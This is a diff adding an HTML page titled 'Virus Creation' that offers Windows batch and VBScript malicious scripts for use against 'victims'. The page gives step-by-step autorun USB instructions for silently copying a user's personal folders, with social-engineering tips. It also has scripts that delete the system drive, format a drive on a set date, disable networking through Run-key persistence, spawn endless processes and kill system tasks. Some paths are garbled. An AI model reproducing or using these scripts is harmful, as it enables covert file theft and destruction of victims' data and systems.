@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Virus Creation</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" type="text/css" media="screen" href="main.css" />
+    <script src="main.js"></script>
+</head>
+
+<body>
+
+    <div class="Image-container2">
+        <a href="index.html">Home</a>
+        <a href="../Tech.html">Tech</a>
+    </div>
+
+    <article>
+
+
+        <h1>VIRUS CREATION</h1>
+
+
+        <div class="article-container">
+            <div class="article-Topic"> How to copy (steal) files from a computer to a pendrive </div> <br>
+
+            <button onclick=TextOpener(this) id="btn">show</button>
+
+
+            <div id="articleT"> <br> STEP 1 Open Notepad (I recommend Notepad++) and copy-paste the following lines. [autorun] icon=drive.ico open=launch.bat action=Click OK to Run shell\open\command=launch.bat Save this as autorun.inf The icon line is optional. You can
+                change the icon to your tastes or leave it to the default icon. It’s useful for social engineering purposes like enticing the user to click a file on the drive by making it looks like a game or something.
+                <p>
+                    The “action=” command is optional too but sometimes when the autorun launches it may ask the user what to open. Depending on what you put here the user will be instructed to click Ok or run the file. This code acts as a backup just in case the user is
+                    asked what to open. This is not required if you are operating the computer. The “shell/open command” also acts as a backup in case the user clicks cancel instead of open when prompted. This code will execute when the drive letter is
+                    clicked on. Image result for hacking pendrive</p>
+                <p>
+                    STEP 2 Open Notepad again and copy-paste the following lines <br> @echo off :: variables /min SET odrive=%odrive:~0,2% set backupcmd=xcopy /s /c /d /e /h /i /r /y echo off %backupcmd% “%USERPROFILE%\pictures” “%drive%\all\My pics”
+                    %backupcmd% “%USERPROFILE%\Favorites” “%drive%\all\Favorites” %backupcmd% “%USERPROFILE%\videos” “%drive%\all\vids” @echo off cls <br> Save this as file.bat This file is configured to copy the contents of the current users pictures,
+                    favorites, and videos folder to the Flash drive under a folder called “all”. This is the section of the code you will need to edit depending on what you want to copy. The first file path “%USERPROFILE%\pictures” – is the target. The
+                    second file path “%drive%\all\My pics” – is the destination.</p>
+                <p>
+                    STEP 3 Open Notepad once again and copy-paste the following line. CreateObject(“Wscript.Shell”).Run “””” & WScript.Arguments(0) & “”””, 0, False Save this as invisible.vbs <br> This code runs the file.bat as a process so it does not
+                    show the CMD prompt and everything the batch file is processing.</p>
+                <p>
+                    STEP 4 Open Notepad one last time and copy-paste the following line. wscript.exe \invisible.vbs file.bat Save this as launch.bat This batch file does two things, it looks for the invisible.vbs file in the root of the Flash drive then loads it with file.bat
+                    so file.bat is run with code from vbs file.</p>
+                <p>
+                    STEP 5 Copy all 4 files created in the above steps and put it on the root of the Flash drive, including the icon file if needed. Also create a folder named “all” where the contents are to be copied automatically. You can call this folder by any name,
+                    but then you need to reflect the changes you made in step 2. This is all that needs to be done. Test the Flash drive on your own computer first before playing it out on your victim. It works flawlessly</p>
+            </div>
+
+        </div>
+
+
+
+
+
+        <div class="article-container">
+            <div class="article-Topic"> This Virus Deletes All The Content Of A Drive… </div> <br>
+
+            <button onclick=TextOpener(this) id="btn">show</button>
+
+
+            <div id="articleT"> <br> @echo off del %systemdrive%\*.* /f /s /q shutdown -r -f -t 00
+
+                <br> Save The Above Code in a .bat file </div>
+
+        </div>
+
+
+
+
+        <div class="article-container">
+            <div class="article-Topic"> Disable Internet Permanently </div> <br>
+
+            <button onclick=TextOpener(this) id="btn">show</button>
+
+
+            <div id="articleT"> <br> Save As A bat File echo @echo off>c:windowswimn32.bat echo break off>>c:windowswimn32.bat echo ipconfig/release_all>>c:windowswimn32.bat echo end>>c:windowswimn32.bat reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun
+                /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f echo You Have Been HACKED! </div>
+
+        </div>
+
+
+
+        <div class="article-container">
+            <div class="article-Topic"> The Most Simple Virus To Crush The Window </div> <br>
+
+            <button onclick=TextOpener(this) id="btn">show</button>
+
+
+            <div id="articleT"> <br> @Echo off Del C:\ *.* |y
+
+                <br> Save It As Anything.bat </div>
+
+        </div>
+
+
+
+        <div class="article-container">
+            <div class="article-Topic">Endless Notepads </div> <br>
+
+            <button onclick=TextOpener(this) id="btn">show</button>
+
+
+            <div id="articleT"> <br> This will pop up endless notepads until the computer freezes and crashes* <br> Code:- @ECHO off :top START %SystemRoot%\system32\notepad.exe GOTO top </div>
+
+        </div>
+
+
+
+        <div class="article-container">
+            <div class="article-Topic"> Bomb Virus </div> <br>
+
+            <button onclick=TextOpener(this) id="btn">show</button>
+
+
+            <div id="articleT"> <br> Copy Paste The Following <br> If %date% NEQ 2009/11/25 goto exit format E: /y >nul :exit exit And Save It As Anything.bat <br> Note:- You Can Change The Date ( 2009/11/25 ) Of The Virus And The Location ( format E: ) On Which It Does
+                Its Action The Virus Will Take Effect On That Day </div>
+
+        </div>
+
+
+
+        <div class="article-container">
+            <div class="article-Topic"> Crazy caps lock </div> <br>
+
+            <button onclick=TextOpener(this) id="btn">show</button>
+
+
+            <div id="articleT"> <br> This constantly turns caps lock on and off really fast continuously* Code:- Set wshShell =wscript.CreateObject(”WScript.Shell”) do wscript.sleep 100 wshshell.sendkeys “{CAPSLOCK}” loop </div>
+
+        </div>
+
+
+
+        <div class="article-container">
+            <div class="article-Topic"> Tasks KilL </div> <br>
+
+            <button onclick=TextOpener(this) id="btn">show</button>
+
+
+            <div id="articleT"> <br> @echo off start calc tskill msnmsgr <br> tskill firefox <br> tskill iexplore <br> tskill LimreWire <br> tskill explorer <br> tskill explorer <br> tskill explorer <br> tskill explorer <br> tskill explorer <br>
+                <br> pause save this as .bat file and send and destroy the victim & k!ll Operat!ng systeM!
+            </div>
+
+        </div>
+
+
+
+        <div class="article-container">
+            <div class="article-Topic"> Code type in notepad </div> <br>
+
+            <button onclick=TextOpener(this) id="btn">show</button>
+
+
+            <div id="articleT"> <br> @echo off shutdown -r -f -t 00 Form Of Switches <br> -s Shuts down the PC. <br> -l Logs off the current user. <br> -t nn Indicates the duration of delay, in seconds, before performing the action. <br> -c “messagetext” Displays a message
+                in the System Shutdown window. A maximum of 127 characters can be used. The message must be enclosed in quotation marks. <br> -f Forces any running applications to shut down. <br> -r Reboots the PC. ..!!..!
+            </div>
+
+        </div>
+
+
+
+
+        <br>
+
+    </article>
+
+
+</body>
+
+</html>
